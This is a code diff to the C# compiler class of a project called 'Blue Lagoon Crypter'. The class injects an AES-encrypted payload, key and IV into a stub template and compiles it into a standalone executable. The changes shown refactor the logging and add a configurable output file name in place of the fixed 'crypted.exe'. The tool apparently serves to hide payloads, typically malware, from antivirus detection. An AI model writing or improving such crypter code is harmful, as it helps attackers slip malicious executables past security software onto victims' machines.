@@ -14,15 +14,18 @@ namespace Blue_Lagoon_Crypter__Windowed_.Tools
         private byte[] IV;
         private byte[] Base64;
 
+        public string OutputProgramName;
+
         string Stub = Resources.Stub;
 
         private List<string> replacementLog = new List<string>(); // List to store replacement information
 
-        public Compiler(string base64Aes, string key, string iv)
+        public Compiler(string base64Aes, string key, string iv, string outputProgramName)
         {
             this.Key = Convert.FromBase64String(key);
             this.IV = Convert.FromBase64String(iv);
             this.Base64 = Convert.FromBase64String(base64Aes);
+            this.OutputProgramName = outputProgramName;
 
             // Log key, IV, and base64 data
             LogData("Key", Key);
@@ -32,6 +35,25 @@ namespace Blue_Lagoon_Crypter__Windowed_.Tools
             SetSettings();
         }
 
+        
+
+        public void SetSettings()
+        {
+            try
+            {
+                // Log the replacements made in the Stub string
+                LogReplacements();
+
+                Stub = Stub.Replace("%BASE64%", Convert.ToBase64String(Base64)).Replace("%KEY%", Convert.ToBase64String(Key)).Replace("%IV%", Convert.ToBase64String(IV));
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e.Message);
+            }
+        }
+
+        // ///////////////////////////////////////////////////////////////
+        #region Logging Methods
         private void LogData(string name, byte[] data)
         {
             try
@@ -52,22 +74,6 @@ namespace Blue_Lagoon_Crypter__Windowed_.Tools
                 Console.WriteLine("Error logging " + name + " : " + ex.Message);
             }
         }
-
-        public void SetSettings()
-        {
-            try
-            {
-                // Log the replacements made in the Stub string
-                LogReplacements();
-
-                Stub = Stub.Replace("%BASE64%", Convert.ToBase64String(Base64)).Replace("%KEY%", Convert.ToBase64String(Key)).Replace("%IV%", Convert.ToBase64String(IV));
-            }
-            catch (Exception e)
-            {
-                Console.WriteLine(e.Message);
-            }
-        }
-
         // Log the replacements made in the Stub string
         private void LogReplacements()
         {
@@ -87,14 +93,60 @@ namespace Blue_Lagoon_Crypter__Windowed_.Tools
                 Console.WriteLine("Error logging replacements: " + ex.Message);
             }
         }
+        private void LogError(string operation, string errorMessage)
+        {
+            try
+            {
+                using (StreamWriter writer = new StreamWriter("logging_compiler.txt", true))
+                {
+                    string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
+                    writer.WriteLine(timestamp + " Error in " + operation + " :");
+
+                    writer.WriteLine(errorMessage);
+
+                    writer.WriteLine();
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error logging " + operation + " error: " + ex.Message);
+            }
+        }
+        private void LogCompilationResult(CompilerResults compilerResults)
+        {
+            try
+            {
+                using (StreamWriter writer = new StreamWriter("logging_compiler.txt", true))
+                {
+                    if (compilerResults.Errors.Count > 0)
+                    {
+                        writer.WriteLine("Compilation Errors:");
+                        foreach (CompilerError compilerError in compilerResults.Errors)
+                        {
+                            writer.WriteLine(compilerError.ToString());
+                        }
+                    }
+                    else
+                    {
+                        writer.WriteLine("File has been compiled successfully!");
+                    }
+                    writer.WriteLine();
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error logging compilation result: " + ex.Message);
+            }
+        }
+        #endregion
 
         public void Compile()
         {
             try
             {
-                string[] referencedAsm = new string[] // 09.09.2023 ___ 3:50 am ___ after changing the Stub and adding execution, added 'Threading.Thread.dll'
+                string[] referencedAsm = new string[] 
                 {
-                    "System.dll", "System.IO.dll", "System.Runtime.InteropServices.dll", "Mscorlib.dll", "System.Core.dll"//, "System.Diagnostics.dll"//, "System.Threading.Thread.dll"
+                    "System.dll", "System.IO.dll", "System.Runtime.InteropServices.dll", "Mscorlib.dll", "System.Core.dll", "System.Windows.Forms.dll" // last dll for debugging
                 };
                 Dictionary<string, string> providerOptions = new Dictionary<string, string>()
                 {
@@ -106,7 +158,7 @@ namespace Blue_Lagoon_Crypter__Windowed_.Tools
                     CompilerParameters compilerParam = new CompilerParameters(referencedAsm)
                     {
                         GenerateExecutable = true,
-                        OutputAssembly = "crypted.exe",
+                        OutputAssembly = NameConstructor(),
                         CompilerOptions = compileOptions,
                         TreatWarningsAsErrors = true
                     };
@@ -137,50 +189,18 @@ namespace Blue_Lagoon_Crypter__Windowed_.Tools
                 LogError("Error during compilation", ex.Message);
             }
         }
-        private void LogError(string operation, string errorMessage)
+
+        private string NameConstructor()
         {
-            try
-            {
-                using (StreamWriter writer = new StreamWriter("logging_compiler.txt", true))
-                {
-                    string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
-                    writer.WriteLine(timestamp + " Error in " + operation + " :");
+            string OtpProgramName;
 
-                    writer.WriteLine(errorMessage);
-
-                    writer.WriteLine();
-                }
-            }
-            catch (Exception ex)
+            if (OutputProgramName.Length > 0)
             {
-                Console.WriteLine("Error logging " + operation + " error: " + ex.Message);
+                return OtpProgramName = $"{OutputProgramName}.exe";
             }
-        }
-
-        private void LogCompilationResult(CompilerResults compilerResults)
-        {
-            try
+            else
             {
-                using (StreamWriter writer = new StreamWriter("logging_compiler.txt", true))
-                {
-                    if (compilerResults.Errors.Count > 0)
-                    {
-                        writer.WriteLine("Compilation Errors:");
-                        foreach (CompilerError compilerError in compilerResults.Errors)
-                        {
-                            writer.WriteLine(compilerError.ToString());
-                        }
-                    }
-                    else
-                    {
-                        writer.WriteLine("File has been compiled successfully!");
-                    }
-                    writer.WriteLine();
-                }
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine("Error logging compilation result: " + ex.Message);
+                return OtpProgramName = $"build.exe";
             }
         }
     }
